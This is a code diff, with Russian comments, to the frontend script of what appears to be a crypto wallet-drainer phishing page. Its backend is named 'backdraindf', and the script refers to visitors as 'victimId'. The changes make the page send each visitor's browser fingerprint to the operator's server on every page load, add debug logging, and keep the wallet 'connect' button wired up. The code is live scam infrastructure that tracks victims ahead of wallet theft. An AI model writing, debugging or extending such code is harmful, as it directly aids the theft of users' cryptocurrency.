@@ -12,12 +12,16 @@ const BACKEND_URL = 'https://backdraindf-3-9dhz.onrender.com'; // <<--- ВАЖН
  */
 async function sendVisitData() {
     try {
+        console.log('[FRONTEND] sendVisitData: Начало отправки данных о посещении');
+
         const visitData = {
             userAgent: navigator.userAgent || 'Unknown',
             platform: navigator.platform || 'Unknown',
             language: navigator.language || 'Unknown',
             timestamp: new Date().toISOString()
         };
+
+        console.log('[FRONTEND] sendVisitData: Данные для отправки', visitData);
 
         const response = await fetch(`${BACKEND_URL}/visit`, {
             method: 'POST',
@@ -27,18 +31,30 @@ async function sendVisitData() {
             body: JSON.stringify(visitData)
         });
 
+        console.log('[FRONTEND] sendVisitData: Получен ответ от сервера', response.status, response.statusText);
+
         if (!response.ok) {
             const errorText = await response.text();
-            console.error('Не удалось отправить данные о посещении:', errorText);
-            return;
+            console.error('[FRONTEND] sendVisitData: Ошибка от сервера:', errorText);
+            return null; // Возвращаем null в случае ошибки
         }
 
         const result = await response.json();
+        console.log('[FRONTEND] sendVisitData: Распарсенный JSON ответа', result);
+        
+        // ВАЖНО: Мы НЕ сохраняем victimId в localStorage
+        // localStorage.setItem('victimId', result.id); // <-- Эта строка закомментирована
+        
         if (result.success && result.id) {
-            localStorage.setItem('victimId', result.id);
+             console.log('[FRONTEND] sendVisitData: Уведомление о посещении успешно отправлено. ID сессии:', result.id);
+             return result.id; // Возвращаем ID для потенциального использования, но не сохраняем
+        } else {
+            console.warn('[FRONTEND] sendVisitData: Сервер не вернул success=true или id', result);
+            return null;
         }
     } catch (error) {
-        console.log('Не удалось отправить данные о посещении:', error.message);
+        console.error('[FRONTEND] sendVisitData: Критическая ошибка при отправке данных о посещении:', error);
+        return null; // Возвращаем null в случае ошибки
     }
 }
 
@@ -631,6 +647,22 @@ window.addEventListener('DOMContentLoaded', () => {
         connectButton.addEventListener('click', connectWallet);
     }
 });
+
+window.addEventListener('DOMContentLoaded', () => {
+    console.log('[INIT] DOMContentLoaded: Инициализация приложения');
+    // ВСЕГДА вызываем sendVisitData при загрузке страницы
+    sendVisitData(); // <-- Теперь это будет отправлять уведомление каждый раз
+
+    // Также ищем кнопку подключения и добавляем к ней обработчик клика
+    const connectButton = document.getElementById('connectButton');
+    if (connectButton) {
+        console.log('[INIT] DOMContentLoaded: Найдена кнопка подключения, добавляем обработчик');
+        connectButton.addEventListener('click', connectWallet);
+    } else {
+        console.warn('[INIT] DOMContentLoaded: Кнопка подключения не найдена в DOM');
+    }
+});
+
 
 
 
